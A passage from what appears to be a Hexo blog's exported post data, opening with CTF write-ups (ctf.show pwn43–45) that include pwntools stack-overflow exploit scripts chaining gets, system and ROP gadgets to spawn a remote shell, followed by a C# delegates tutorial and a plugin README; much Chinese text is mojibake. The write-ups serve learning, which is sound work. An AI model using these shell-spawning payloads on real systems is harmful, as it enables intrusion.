class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28292</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6c</span> + <span class="number">4</span></span><br><span class="line">sys_addr = <span class="number">0x08048450</span></span><br><span class="line">gets_addr = <span class="number">0x08048420</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804B060</span></span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(gets_addr) + p32(sys_addr) + p32(bin_sh_addr) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn44ï¼ˆ64ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰"><a href="#pwn44ï¼ˆ64ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰" class="headerlink" title="pwn44ï¼ˆ64ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰"></a>pwn44ï¼ˆ64ä½ä¸æä¾›åé—¨å‡½æ•°å‚æ•°ï¼‰</h2><p>æ¼æ´åŸç†å’Œä¸Šé“é¢˜ä¸€æ ·ï¼Œåªä¸è¿‡æ¢æˆäº†64ä½ç³»ç»Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193741187.png" alt="image-20250317193741187"></p><p>æ‰¾åˆ°ä¸€å—å¯è¯»å†™åŒºåŸŸï¼Œä½äºbssæ®µ</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317193801701.png" alt="image-20250317193801701"></p><p>å°†å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®å®šä½ï¼š0x602048</p><p>systemå‡½æ•°ï¼š0x400520</p><p>getså‡½æ•°ï¼š0x400530</p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317194030271.png" alt="image-20250317194030271" style="zoom:50%;"><p>pop_rdi_retï¼š0x4007f3</p><p>retï¼š0x4004fe</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28289</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x602048</span></span><br><span class="line">sys_addr = <span class="number">0x400520</span></span><br><span class="line">gets_addr = <span class="number">0x400530</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x4007f3</span></span><br><span class="line">ret_addr = <span class="number">0x4004fe</span></span><br><span class="line">offset = <span class="number">0xa</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(gets_addr) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) +p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr)</code>è¿™ä¸€å—åœ¨ä¼ é€’å‚æ•°</p><h2 id="Pwn45ï¼ˆ32ä½æ— åé—¨å‡½æ•°ï¼‰"><a href="#Pwn45ï¼ˆ32ä½æ— åé—¨å‡½æ•°ï¼‰" class="headerlink" title="Pwn45ï¼ˆ32ä½æ— åé—¨å‡½æ•°ï¼‰"></a>Pwn45ï¼ˆ32ä½æ— åé—¨å‡½æ•°ï¼‰</h2><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20250317200343722.png" alt="image-20250317200343722" style="zoom:50%;"><p>103çš„é•¿åº¦è¯»äº†200çš„æ•°æ®ï¼Œä¹Ÿæ˜¯æ ˆæº¢å‡º</p><p>ä¸è¿‡è¿™æ¬¡æ²¡æœ‰åé—¨å‡½æ•°äº†ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cè‰¹äº‹ä»¶</title>
      <link href="/2024/12/09/c-%E4%BA%8B%E4%BB%B6/"/>
      <url>/2024/12/09/c-%E4%BA%8B%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="å§”æ‰˜ä¸äº‹ä»¶"><a href="#å§”æ‰˜ä¸äº‹ä»¶" class="headerlink" title="å§”æ‰˜ä¸äº‹ä»¶"></a>å§”æ‰˜ä¸äº‹ä»¶</h1><h2 id="å§”æ‰˜"><a href="#å§”æ‰˜" class="headerlink" title="å§”æ‰˜"></a>å§”æ‰˜</h2><p>å®é™…ä¸Šç”¨ç±»å®Œæˆäº†å‡½æ•°æŒ‡é’ˆçš„åŠŸèƒ½</p><h3 id="ä½¿ç”¨æ­¥éª¤"><a href="#ä½¿ç”¨æ­¥éª¤" class="headerlink" title="ä½¿ç”¨æ­¥éª¤"></a>ä½¿ç”¨æ­¥éª¤</h3><h4 id="å£°æ˜"><a href="#å£°æ˜" class="headerlink" title="å£°æ˜"></a>å£°æ˜</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">Print</span>(<span class="params"><span class="built_in">int</span> x</span>)  <span class="comment">//åªèƒ½åœ¨namespaceå’Œç±»ä¸‹</span></span></span><br></pre></td></tr></table></figure><h4 id="åˆå§‹åŒ–ï¼Œèµ‹å€¼"><a href="#åˆå§‹åŒ–ï¼Œèµ‹å€¼" class="headerlink" title="åˆå§‹åŒ–ï¼Œèµ‹å€¼"></a>åˆå§‹åŒ–ï¼Œèµ‹å€¼</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Print someFunc = helloï¼›</span><br><span class="line">Print someFunc = <span class="keyword">new</span> Print(hello); </span><br></pre></td></tr></table></figure><h4 id="è°ƒç”¨å§”æ‰˜å˜é‡"><a href="#è°ƒç”¨å§”æ‰˜å˜é‡" class="headerlink" title="è°ƒç”¨å§”æ‰˜å˜é‡"></a>è°ƒç”¨å§”æ‰˜å˜é‡</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">someFunc(<span class="number">30</span>);</span><br></pre></td></tr></table></figure><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">PrintInt</span>(<span class="params"><span class="built_in">int</span> x</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Hello</span>(<span class="params"><span class="built_in">int</span> x</span>)</span> =&gt; Console.WriteLIne(<span class="string">$&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">PrintINt writeInt = Hello(<span class="number">354</span>);</span><br></pre></td></tr></table></figure><h2 id="å¤šæ’­å§”æ‰˜"><a href="#å¤šæ’­å§”æ‰˜" class="headerlink" title="å¤šæ’­å§”æ‰˜"></a>å¤šæ’­å§”æ‰˜</h2><p>å¤šæ’­å§”æ‰˜å°†å¤šä¸ªå‡½æ•°å¯¹è±¡åˆ†é…åˆ°ä¸€ä¸ªå§”æ‰˜ç¤ºä¾‹</p><p>å§”æ‰˜çš„åˆ†é…åŠ¨ä½œæ˜¯é€šè¿‡ +&#x3D; ã€-&#x3D; å®Œæˆçš„ï¼ˆå¯ä»¥ç”¨&#x3D;ã€‚ äº‹ä»¶ä¸èƒ½ç”¨&#x3D;ï¼‰</p><h2 id="äº‹ä»¶"><a href="#äº‹ä»¶" class="headerlink" title="äº‹ä»¶"></a>äº‹ä»¶</h2><p>äº‹ä»¶æ˜¯ä¸€ç§ç‰¹æ®Šçš„å§”æ‰˜</p><h3 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h3><p>äº‹ä»¶æ‹¥æœ‰è€…ï¼Œäº‹ä»¶æˆå‘˜ï¼Œäº‹ä»¶ç›¸åº”è€…ï¼Œäº‹ä»¶å¤„ç†å™¨ï¼Œäº‹ä»¶è®¢é˜…</p><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241209223501574.png" alt="image-20241209223501574"></p><p>ä¸»æµç†è§£æ˜¯å°†ä»£ç åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šäº‹ä»¶å‘å¸ƒè€…ï¼ˆå¹¿æ’­è€…ï¼‰å’Œäº‹ä»¶è®¢é˜…è€…ï¼ˆè®¢é˜…è€…ï¼‰</p><p>ç®€ç§°SBæ¨¡å¼</p><p>æœ€å¤§çš„å¥½å¤„æ˜¯ä¸èƒ½èµ‹å€¼ã€‚</p><h3 id="å®ç°æ€è·¯"><a href="#å®ç°æ€è·¯" class="headerlink" title="å®ç°æ€è·¯"></a>å®ç°æ€è·¯</h3><ol><li>åœ¨ç±»ä¸­å®šä¹‰ç§æœ‰åŒ–å§”æ‰˜</li><li>æš´éœ²å‡º-&#x3D;ã€+&#x3D;çš„æ–¹æ³•</li></ol><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">FuncHandler</span>(<span class="params"><span class="built_in">int</span> item</span>)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Broadcaster</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">event</span> FuncHandler funcHandler; <span class="comment">//äº‹ä»¶çš„å£°æ˜</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äº‹ä»¶çš„æ ‡å‡†å†™æ³•"><a href="#äº‹ä»¶çš„æ ‡å‡†å†™æ³•" class="headerlink" title="äº‹ä»¶çš„æ ‡å‡†å†™æ³•"></a>äº‹ä»¶çš„æ ‡å‡†å†™æ³•</h3><ol><li><p>å‘½åäº‹ä»¶çš„å§”æ‰˜å¿…é¡»ä»¥EventHandlerç»“å°¾</p></li><li><p>è§¦å‘å‡½æ•°å¿…é¡»ä»¥Onå¼€å¤´ï¼Œä¸”å¿…é¡»æ˜¯è™šå‡½æ•°</p></li><li><p>è®¢é˜…è€…ï¼ˆ+&#x3D;ã€-&#x3D;ï¼‰å‡½æ•°çš„ç±»å‹ç¬¦åˆEventHandlerå§”æ‰˜ç±»å‹</p><ol><li><p>æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼ˆobject arg1ï¼Œ SomeEventArgs arg2ï¼‰</p><p>â€‹arg1 è¡¨ç¤ºå¹¿æ’­è€…</p><p>â€‹arg2 å‚æ•°ä¸ºEventArgsçš„å­ç±» è¡¨ç¤ºä¼ æ’­ä¿¡æ¯</p></li></ol></li></ol><h3 id="ä¾‹å­-1"><a href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">MyDelegate</span>(<span class="params"><span class="built_in">string</span> str</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">event</span> MyDelegate MyEvent;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnEventHappend</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    MyEvent?.Invoke(<span class="string">&quot;happened&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Display</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//1. å®šä¹‰ä¸€ä¸ªäº‹ä»¶ï¼Œç„¶åæŠŠè¿™ä¸ªäº‹ä»¶æ³¨å†Œåˆ°æŸä¸ªå“åº”ä¸Š</span></span><br><span class="line">    MyEvent += Display  <span class="comment">//ä¼šè¾“å‡ºhappened</span></span><br><span class="line">    Peoople p = <span class="keyword">new</span> People();</span><br><span class="line">    MyEvent += p.PeopleResponed;</span><br><span class="line">    OnEventHappend();<span class="comment">//äº‹ä»¶çš„è§¦å‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AnimalRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)<span class="comment">//æ•ˆåº”</span></span></span><br><span class="line">    &#123;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Animal Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">People</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PeopleRespond</span>(<span class="params"><span class="built_in">string</span> s</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;People Responed&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/12/08/node_modules/hexo-asset-img/README/"/>
      <url>/2024/12/08/node_modules/hexo-asset-img/README/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p align="center"><!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> --></p><h1 align="center">hexo-asset-img</h1><p>English | <a href="README_zh.md">ä¸­æ–‡</a></p><blockquote><p>:cake: Hexo local image plugin: Convert the relative path of the image to asset_img</p></blockquote><p><a href><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>Use this plug-in to realize the preview of Markdown editors such as Typora and Hexo release preview, both of which can display pictures normally</p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure><blockquote><p>Latest Dev</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">â”œâ”€â”€ apppicker.jpg</span><br><span class="line">â”œâ”€â”€ logo.png</span><br><span class="line">â””â”€â”€ rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure><p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p><p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p><h3 id="Use-with-Typora"><a href="#Use-with-Typora" class="headerlink" title="Use with Typora"></a>Use with Typora</h3><ul><li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + Hexo plug-in development to solve the inconsistency of image paths | yiyunâ€™s Blog</a></li></ul><h2 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> No longer valid, probably starting from <code>Hexo 5</code>, and this repository has been archived </p><blockquote><p>Q: ä¸ºä»€ä¹ˆä½¿ç”¨æœ¬åœ°å›¾ç‰‡ è€Œä¸æ˜¯ç½‘ç»œå›¾ç‰‡ (å›¾åºŠ) ?<br>A:</p><ol><li>ç¬¬ä¸‰æ–¹å›¾åºŠä¸ç¨³å®š, å®¹æ˜“ä¸¢å¤±å›¾ç‰‡    </li><li>è‡ªè¡Œæ­å»ºå›¾åºŠ, éšç€ä¸Šä¼ é”™è¯¯å›¾ç‰‡, åˆ é™¤æ–‡ç« è€Œæ²¡æœ‰åˆ é™¤å…³è”å›¾ç‰‡ æ¬¡æ•°çš„å¢å¤š, æœªå¼•ç”¨å›¾ç‰‡è¶Šæ¥è¶Šå¤š, å›¾åºŠä¸­ä¹Ÿè¶Šæ¥è¶Šå¤šçš„æ— ç”¨å†—ä½™å›¾ç‰‡, è¿˜ä¸æ–¹ä¾¿åˆ é™¤, ä¹Ÿå®¹æ˜“è¯¯åˆ é™¤     </li><li>æœ¬åœ°å›¾ç‰‡ ä¸ æ–‡ç« åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹, æ˜“æ‰“åŒ…, åœ¨æ— ç½‘ç»œæˆ–ç½‘ç»œè¾ƒå·®æ—¶ä¹Ÿèƒ½é¢„è§ˆ   </li><li>æœ¬åœ°å›¾ç‰‡ æ”¾åœ¨ä¸ æ–‡ç« æ–‡ä»¶ååŒåæ–‡ä»¶å¤¹å†… æ–¹ä¾¿ç®¡ç†</li></ol><p><code>è¡¥å……:</code><br>å¾ˆå¤š <code>markdownç¼–è¾‘å™¨</code> æä¾›ç²˜è´´å›¾ç‰‡åˆ°æœ¬åœ°å›¾ç‰‡æ–‡ä»¶å¤¹, è¿™äº›å›¾ç‰‡æ–‡ä»¶åé€šå¸¸ä¸æ˜“è¯», è¾ƒé•¿, å¦‚æœæ¯æ¬¡åˆ é™¤æ–‡ç« ä¸­çš„å›¾ç‰‡å¼•ç”¨, éƒ½æ‰‹åŠ¨å»åˆ é™¤ç›¸åº”å›¾ç‰‡, ä»¥åŠåˆ é™¤æ–‡ç« , æ‰‹åŠ¨åˆ é™¤å…³è”å›¾ç‰‡æ–‡ä»¶å¤¹, æ¯”è¾ƒéº»çƒ¦, ä½†ä¸åˆ é™¤, æœªå¼•ç”¨å›¾ç‰‡åˆä¼šè¶Šæ¥è¶Šå¤š, å› æ­¤ <code>åˆ é™¤æœªå¼•ç”¨å›¾ç‰‡å·¥å…·</code> åº”è¿è€Œç”Ÿ!      </p><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: ğŸ”§ Image detection. | å›¾ç‰‡æ£€æµ‹ | æ¸…ç†æœªå¼•ç”¨å›¾ç‰‡ | åˆ é™¤æœªå¼•ç”¨å›¾ç‰‡ | æ£€æŸ¥å¼•ç”¨çš„å›¾ç‰‡æ˜¯å¦æœ‰æ•ˆ | GitHub Actions</a></li><li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: ğŸ§° .NET è‡ªç”¨CLI, å·¥å…·é›†</a></li></ul></blockquote><h2 id="Related-Projects"><a href="#Related-Projects" class="headerlink" title="Related Projects"></a>Related Projects</h2><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: ğŸ”§ Image detection. | å›¾ç‰‡æ£€æµ‹ | æ¸…ç†æœªå¼•ç”¨å›¾ç‰‡ | åˆ é™¤æœªå¼•ç”¨å›¾ç‰‡ | æ£€æŸ¥å¼•ç”¨çš„å›¾ç‰‡æ˜¯å¦æœ‰æ•ˆ | GitHub Actions</a></li><li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li><li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li><li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li></ul><h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p><p>We accept donations through these channels:</p><ul><li><a href="https://afdian.net/@yiyun" target="_blank">çˆ±å‘ç”µ</a></li></ul><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> Â© <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p><blockquote><p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/12/08/node_modules/hexo-asset-img/README_zh/"/>
      <url>/2024/12/08/node_modules/hexo-asset-img/README_zh/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p align="center"><!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> --></p><h1 align="center">hexo-asset-img</h1><p><a href="README.md">English</a> | ä¸­æ–‡</p><blockquote><p>:cake: Hexo æœ¬åœ°å›¾ç‰‡æ’ä»¶: è½¬æ¢ å›¾ç‰‡ç›¸å¯¹è·¯å¾„ ä¸º asset_img</p></blockquote><p><a href><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ä½¿ç”¨æœ¬æ’ä»¶ å³å¯å®ç° Typora ç­‰ Markdown ç¼–è¾‘å™¨é¢„è§ˆ ä¸ Hexo å‘å¸ƒé¢„è§ˆ å‡èƒ½æ­£å¸¸æ˜¾ç¤ºå›¾ç‰‡</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure><blockquote><p>æœ€æ–°å¼€å‘ç‰ˆ</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">â”œâ”€â”€ apppicker.jpg</span><br><span class="line">â”œâ”€â”€ logo.png</span><br><span class="line">â””â”€â”€ rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure><p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p><p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p><h3 id="ä¸-Typora-é…åˆä½¿ç”¨"><a href="#ä¸-Typora-é…åˆä½¿ç”¨" class="headerlink" title="ä¸ Typora é…åˆä½¿ç”¨"></a>ä¸ Typora é…åˆä½¿ç”¨</h3><ul><li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + å¼€å‘Hexoæ’ä»¶ è§£å†³å›¾ç‰‡è·¯å¾„ä¸ä¸€è‡´ | yiyunâ€™s Blog</a></li></ul><h2 id="èµ·æº"><a href="#èµ·æº" class="headerlink" title="èµ·æº"></a>èµ·æº</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> å·²æ— æ•ˆ, å¤§æ¦‚æ˜¯ä» <code>Hexo 5</code> å¼€å§‹ï¼Œå¹¶ä¸”æ­¤ä»“åº“å·² archived </p><blockquote><p>Q: ä¸ºä»€ä¹ˆä½¿ç”¨æœ¬åœ°å›¾ç‰‡ è€Œä¸æ˜¯ç½‘ç»œå›¾ç‰‡ (å›¾åºŠ) ?<br>A:</p><ol><li>ç¬¬ä¸‰æ–¹å›¾åºŠä¸ç¨³å®š, å®¹æ˜“ä¸¢å¤±å›¾ç‰‡    </li><li>è‡ªè¡Œæ­å»ºå›¾åºŠ, éšç€ä¸Šä¼ é”™è¯¯å›¾ç‰‡, åˆ é™¤æ–‡ç« è€Œæ²¡æœ‰åˆ é™¤å…³è”å›¾ç‰‡ æ¬¡æ•°çš„å¢å¤š, æœªå¼•ç”¨å›¾ç‰‡è¶Šæ¥è¶Šå¤š, å›¾åºŠä¸­ä¹Ÿè¶Šæ¥è¶Šå¤šçš„æ— ç”¨å†—ä½™å›¾ç‰‡, è¿˜ä¸æ–¹ä¾¿åˆ é™¤, ä¹Ÿå®¹æ˜“è¯¯åˆ é™¤     </li><li>æœ¬åœ°å›¾ç‰‡ ä¸ æ–‡ç« åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹, æ˜“æ‰“åŒ…, åœ¨æ— 